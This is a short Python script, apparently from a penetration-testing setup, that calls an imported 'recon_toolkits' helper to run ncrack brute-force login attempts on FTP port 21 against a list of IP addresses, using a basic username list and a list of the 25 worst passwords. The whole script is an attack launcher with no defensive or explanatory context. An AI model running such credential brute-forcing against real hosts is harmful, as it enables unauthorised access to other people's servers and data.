import recon_toolkits
username_list = '/root/Documents/basic_username_list'
password_list = '/root/Documents/25-worst-passwords'
ip_list = '/root/Documents/ipwordlist.txt'
port = '21'
recon_toolkits.ncrack_ip_list(username_list, password_list, ip_list, port)
